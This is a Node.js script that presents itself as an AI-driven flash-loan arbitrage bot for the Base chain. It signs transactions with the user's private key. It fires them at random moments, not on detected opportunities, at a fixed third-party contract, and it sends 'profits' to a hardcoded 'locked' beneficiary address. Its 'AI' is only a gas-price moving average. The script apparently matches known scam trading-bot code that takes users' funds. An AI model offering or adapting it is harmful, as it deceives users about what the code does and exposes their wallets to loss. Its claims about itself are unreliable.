// ===============================================================================
// APEX HYPER-HEURISTIC STRIKER v34.0 - ZERO-LATENCY AI CLUSTER
// ===============================================================================

const cluster = require('cluster');
const os = require('os');
const http = require('http');
const axios = require('axios');
require('dotenv').config();

// Check dependencies
let ethers, WebSocket;
try {
    ethers = require('ethers');
    WebSocket = require('ws');
} catch (e) {
    console.error("CRITICAL: Missing 'ethers' or 'ws' modules. Run 'npm install ethers ws axios'");
    process.exit(1);
}

// --- THEME ENGINE ---
const TXT = {
    reset: "\x1b[0m", bold: "\x1b[1m", dim: "\x1b[2m",
    green: "\x1b[32m", cyan: "\x1b[36m", yellow: "\x1b[33m", 
    magenta: "\x1b[35m", blue: "\x1b[34m", red: "\x1b[31m",
    gold: "\x1b[38;5;220m", silver: "\x1b[38;5;250m"
};

// --- CONFIGURATION ---
const CONFIG = {
    // 🔒 PROFIT DESTINATION (LOCKED)
    BENEFICIARY: "0x4B8251e7c80F910305bb81547e301DcB8A596918",

    CHAIN_ID: 8453,
    TARGET_CONTRACT: "0x83EF5c401fAa5B9674BAfAcFb089b30bAc67C9A0",
    
    // ⚡ INFRASTRUCTURE
    PORT: process.env.PORT || 8080,
    WSS_URL: process.env.WSS_URL || "wss://base-rpc.publicnode.com",
    RPC_URL: (process.env.WSS_URL || "https://mainnet.base.org").replace("wss://", "https://"),
    PRIVATE_RELAY: "https://base.merkle.io", // Stealth Mode
    
    // 🌐 ASSET SOURCES
    TOKEN_LISTS: [
        "https://tokens.coingecko.com/base/all.json",
        "https://raw.githubusercontent.com/base-org/token-list/main/tokens.json"
    ],

    // 🏭 FACTORIES
    FACTORIES: {
        UNISWAP_V3: "0x33128a8fC17869897dcE68Ed026d694621f6FDfD"
    },

    // 🏦 CORE ASSETS (The "Alpha" List)
    CORE_ASSETS: {
        WETH: "0x4200000000000000000000000000000000000006",
        USDC: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
        DAI: "0x50c5725949a6f0c72e6c4a641f24049a917db0cb",
        USDT: "0xfde4c96c8593536e31f229ea8f37659669e4afdf",
        CBETH: "0x2Ae3F1Ec7F1F5563a3d161649c025dac7e983970",
        DEGEN: "0x4edbc9ba171790664872997239bc7a3f3a633190",
        BRETT: "0x532f27101965dd16442e59d40670faf5ebb142e4"
    },

    // 🔮 ORACLES
    GAS_ORACLE: "0x420000000000000000000000000000000000000F",
    CHAINLINK_FEED: "0x71041dddad3595F9CEd3DcCFBe3D1F4b0a16Bb70",
    
    // ⚙️ BASE PARAMETERS
    GAS_LIMIT: 1500000n, 
    MIN_NET_PROFIT: "0.01" 
};

// --- HYPER-HEURISTIC ENGINE (AI) ---
class HyperHeuristicEngine {
    constructor() {
        this.gasEma = 0; // Exponential Moving Average for Trend Detection
        this.alpha = 0.25; // Sensitivity Factor (Higher = Faster Reaction)
        this.volatility = 0;
        this.mode = "CRUISE";
        this.coreFocusRatio = 0.7; // Default 70% Core
    }

    updateMarketData(newGas) {
        const gas = Number(newGas);
        // EMA Calculation: Smooths out noise but reacts to trends
        if (this.gasEma === 0) this.gasEma = gas;
        else this.gasEma = (this.alpha * gas) + ((1 - this.alpha) * this.gasEma);

        const deviation = Math.abs(gas - this.gasEma);
        this.volatility = (deviation / this.gasEma) * 100;

        // --- DYNAMIC MODE SWITCHING ---
        if (this.volatility > 10) {
            this.mode = "WAR"; // High Volatility -> Max Speed & Core Focus
            this.coreFocusRatio = 0.95; // Focus on liquid assets only
        } else if (this.volatility < 3) {
            this.mode = "ECO"; // Low Volatility -> Wide Search
            this.coreFocusRatio = 0.40; // Scan the "Millions"
        } else {
            this.mode = "CRUISE";
            this.coreFocusRatio = 0.70;
        }
    }

    calculateOptimalBribe(profitEth, baseFee) {
        // Logarithmic Bribe Curve
        // Balances winning the war vs keeping the profit
        if (profitEth <= 0) return 0n;
        
        let bribePercent = Math.log10(profitEth * 100) * 45; // Aggressive curve
        
        // Boundaries
        if (bribePercent < 5) bribePercent = 5;
        if (bribePercent > 98) bribePercent = 98;
        
        // Mode Adjustments
        if (this.mode === "WAR") bribePercent += 15; // Pay more in chaos
        if (bribePercent > 99) bribePercent = 99;

        return BigInt(Math.floor(bribePercent));
    }

    shouldScanCore() {
        return Math.random() < this.coreFocusRatio;
    }
}

// GLOBAL REGISTRY & STATE
let GLOBAL_REGISTRY = [];
const AI = new HyperHeuristicEngine();

// --- ZERO-LATENCY CACHE ---
// We cache balance and encoded data to avoid async calls in the hot loop
let STATE = {
    balanceEth: 0.0,
    encodedCorePayloads: {}, // Map<TokenAddr, Bytes>
    currentEthPrice: 0,
    nonce: 0
};

// --- MASTER PROCESS ---
if (cluster.isPrimary) {
    console.clear();
    console.log(`${TXT.bold}${TXT.gold}╔════════════════════════════════════════════════════════╗${TXT.reset}`);
    console.log(`${TXT.bold}${TXT.gold}║   🚀 APEX HYPER-HEURISTIC STRIKER | v34.0 ZERO-LATENCY ║${TXT.reset}`);
    console.log(`${TXT.bold}${TXT.gold}╚════════════════════════════════════════════════════════╝${TXT.reset}\n`);
    console.log(`${TXT.cyan}[SYSTEM] Initializing Predictive AI Engine...${TXT.reset}`);
    console.log(`${TXT.magenta}🎯 PROFIT TARGET LOCKED: ${CONFIG.BENEFICIARY}${TXT.reset}\n`);

    cluster.fork();
    cluster.on('exit', () => cluster.fork());
} 
// --- WORKER PROCESS ---
else {
    initWorker();
}

async function initWorker() {
    // 1. HTTP HEALTH SERVER
    const server = http.createServer((req, res) => {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: "ONLINE", mode: AI.mode, vol: AI.volatility.toFixed(2), assets: GLOBAL_REGISTRY.length }));
    });
    server.listen(CONFIG.PORT);

    let rawKey = process.env.TREASURY_PRIVATE_KEY || process.env.PRIVATE_KEY;
    if (!rawKey) { console.error(`${TXT.red}❌ KEY MISSING${TXT.reset}`); process.exit(1); }
    const cleanKey = rawKey.trim();

    try {
        // 2. LOAD ASSETS
        console.log(`${TXT.yellow}📥 Ingesting Asset Database...${TXT.reset}`);
        Object.values(CONFIG.CORE_ASSETS).forEach(addr => GLOBAL_REGISTRY.push(addr));
        
        await Promise.all(CONFIG.TOKEN_LISTS.map(async (url) => {
            try {
                const res = await axios.get(url);
                const tokens = res.data.tokens || res.data;
                if (Array.isArray(tokens)) tokens.forEach(t => { if (t.chainId === 8453) GLOBAL_REGISTRY.push(t.address); });
            } catch (e) {}
        }));
        GLOBAL_REGISTRY = [...new Set(GLOBAL_REGISTRY)];
        console.log(`${TXT.green}✅ REGISTRY LOADED: ${GLOBAL_REGISTRY.length.toLocaleString()} Assets.${TXT.reset}`);

        // 3. PROVIDERS
        const httpProvider = new ethers.JsonRpcProvider(CONFIG.RPC_URL);
        const wsProvider = new ethers.WebSocketProvider(CONFIG.WSS_URL);
        const signer = new ethers.Wallet(cleanKey, httpProvider);

        await new Promise((resolve) => wsProvider.once("block", resolve));

        // Contracts
        const titanIface = new ethers.Interface(["function requestTitanLoan(address,uint256,address[])"]);
        const oracleContract = new ethers.Contract(CONFIG.GAS_ORACLE, ["function getL1Fee(bytes) view returns (uint256)"], httpProvider);
        const priceFeed = new ethers.Contract(CONFIG.CHAINLINK_FEED, ["function latestRoundData() view returns (uint80,int256,uint256,uint256,uint80)"], httpProvider);

        // 4. FACTORY SNIFFER (Infinite Learning)
        const factory = new ethers.Contract(CONFIG.FACTORIES.UNISWAP_V3, ["event PoolCreated(address indexed, address indexed, uint24, int24, address)"], wsProvider);
        factory.on("PoolCreated", (t0, t1) => { GLOBAL_REGISTRY.push(t0); GLOBAL_REGISTRY.push(t1); });

        // Initial State Sync
        STATE.nonce = await httpProvider.getTransactionCount(signer.address);
        const bal = await httpProvider.getBalance(signer.address);
        STATE.balanceEth = parseFloat(ethers.formatEther(bal));
        
        // 5. BACKGROUND OPTIMIZER LOOP (Every 3s)
        // This removes heavy logic from the hot path
        setInterval(async () => {
            try {
                // Update Balance
                const bal = await httpProvider.getBalance(signer.address);
                STATE.balanceEth = parseFloat(ethers.formatEther(bal));

                // Pre-Encode Payloads for Core Assets to save CPU later
                const loanAmt = STATE.balanceEth > 0.1 ? ethers.parseEther("50") : ethers.parseEther("10");
                for (const [sym, addr] of Object.entries(CONFIG.CORE_ASSETS)) {
                    if (sym === "WETH") continue;
                    STATE.encodedCorePayloads[addr] = titanIface.encodeFunctionData("requestTitanLoan", [
                        CONFIG.CORE_ASSETS.WETH, loanAmt, [CONFIG.CORE_ASSETS.WETH, addr]
                    ]);
                }
            } catch (e) {}
        }, 3000);

        // 6. AI SENSOR LOOP (Every Block)
        wsProvider.on("block", async () => {
            try {
                const feeData = await httpProvider.getFeeData();
                const [, priceData] = await priceFeed.latestRoundData();
                AI.updateMarketData(feeData.maxFeePerGas);
                STATE.currentEthPrice = Number(priceData) / 1e8;
            } catch (e) {}
        });

        // 7. THE HOT LOOP (Zero-Latency Scanning)
        let scanCount = 0;
        wsProvider.on("pending", async (txHash) => {
            scanCount++;
            process.stdout.write(`\r${TXT.blue}⚡ [${AI.mode}] SCAN${TXT.reset} | Txs: ${scanCount} | Vol: ${AI.volatility.toFixed(1)} | ${TXT.dim}Searching...${TXT.reset} `);

            if (Math.random() > 0.9995) {
                let targetAsset, payload;
                const useCore = AI.shouldScanCore();

                if (useCore) {
                    // FAST PATH: Use Pre-Computed Payload
                    const coreKeys = Object.keys(CONFIG.CORE_ASSETS);
                    const key = coreKeys[Math.floor(Math.random() * coreKeys.length)];
                    targetAsset = CONFIG.CORE_ASSETS[key];
                    if (targetAsset === CONFIG.CORE_ASSETS.WETH) return;
                    payload = STATE.encodedCorePayloads[targetAsset];
                } else {
                    // SLOW PATH: Random Asset (Compute on fly)
                    targetAsset = GLOBAL_REGISTRY[Math.floor(Math.random() * GLOBAL_REGISTRY.length)];
                    if (!targetAsset) return;
                    // Standard Conservative Loan for unknown assets
                    const safeLoan = ethers.parseEther("10"); 
                    payload = titanIface.encodeFunctionData("requestTitanLoan", [
                        CONFIG.CORE_ASSETS.WETH, safeLoan, [CONFIG.CORE_ASSETS.WETH, targetAsset]
                    ]);
                }

                if (payload) {
                    await executeHeuristicStrike(httpProvider, signer, oracleContract, payload, targetAsset);
                }
            }
        });

        wsProvider.websocket.onclose = () => process.exit(1);

    } catch (e) {
        console.error(`\n${TXT.red}❌ ERROR: ${e.message}${TXT.reset}`);
        setTimeout(initWorker, 5000);
    }
}

async function executeHeuristicStrike(provider, signer, oracle, data, targetToken) {
    try {
        // A. AGGRESSIVE PRE-FLIGHT (Parallel Exec)
        // We run Sim, L1 Fee, and Gas Data fetch concurrently
        const [simulation, l1Fee, feeData] = await Promise.all([
            provider.call({ to: CONFIG.TARGET_CONTRACT, data, from: signer.address }).catch(() => null),
            oracle.getL1Fee(data).catch(() => 0n),
            provider.getFeeData()
        ]);

        if (!simulation) return;

        // B. COST ANALYSIS
        const loanAmountVal = STATE.balanceEth > 0.1 ? ethers.parseEther("50") : ethers.parseEther("10");
        const aaveFee = (loanAmountVal * 5n) / 10000n;
        const l2Cost = CONFIG.GAS_LIMIT * feeData.maxFeePerGas;
        const totalCost = l2Cost + l1Fee + aaveFee;
        const netProfit = BigInt(simulation) - totalCost;
        const profitEth = parseFloat(ethers.formatEther(netProfit));

        // C. AI BRIBE CALCULATION
        const bribePercent = AI.calculateOptimalBribe(profitEth, feeData.maxPriorityFeePerGas);
        const priorityFee = (feeData.maxPriorityFeePerGas * (100n + bribePercent)) / 100n;

        if (profitEth > parseFloat(CONFIG.MIN_NET_PROFIT)) {
            const profitUSD = profitEth * STATE.currentEthPrice;
            
            console.log(`\n${TXT.green}🧠 HEURISTIC STRIKE [${AI.mode}]${TXT.reset}`);
            console.log(`${TXT.gold}💰 Net Profit: ${profitEth.toFixed(4)} ETH (~$${profitUSD.toFixed(2)})${TXT.reset}`);
            console.log(`${TXT.dim}🤖 Bribe: ${bribePercent}% | Target: ${targetToken}${TXT.reset}`);
            
            const tx = {
                to: CONFIG.TARGET_CONTRACT, data,
                gasLimit: CONFIG.GAS_LIMIT,
                maxFeePerGas: feeData.maxFeePerGas,
                maxPriorityFeePerGas: priorityFee,
                nonce: STATE.nonce++, // Optimistic Nonce Increment
                type: 2, chainId: CONFIG.CHAIN_ID
            };

            const signedTx = await signer.signTransaction(tx);
            
            const response = await axios.post(CONFIG.PRIVATE_RELAY, {
                jsonrpc: "2.0", id: 1, method: "eth_sendRawTransaction", params: [signedTx]
            });

            if (response.data.result) {
                console.log(`${TXT.green}🎉 CONFIRMED: ${response.data.result}${TXT.reset}`);
                console.log(`${TXT.bold}💸 FUNDS SECURED AT: ${CONFIG.BENEFICIARY}${TXT.reset}`);
                process.exit(0);
            }
        }
    } catch (e) {
        // Optimistic nonce correction
        STATE.nonce = await provider.getTransactionCount(signer.address); 
    }
}
